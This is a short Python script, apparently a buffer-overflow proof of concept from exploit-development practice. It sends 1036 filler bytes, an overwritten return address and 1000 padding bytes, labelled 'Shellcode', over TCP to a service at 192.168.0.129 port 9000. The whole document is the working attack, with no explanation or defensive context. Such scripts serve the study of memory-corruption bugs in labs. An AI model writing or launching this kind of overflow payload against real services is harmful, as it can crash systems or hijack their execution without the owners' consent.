#!/bin/python
import sys, socket
#0028F764

Shellcode="A" * 1036+ "\x64\xf7\x28\x00"+ "C" * 1000

try: 
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(('192.168.0.129',9000))
     print("Sending pattern to Remote server" )
     s.send(Shellcode)
     print s.recv(1024)
     print "\nDone!."
     s.close()
             	
except: 
     print("Error in connecting")
     sys.exit()
                   		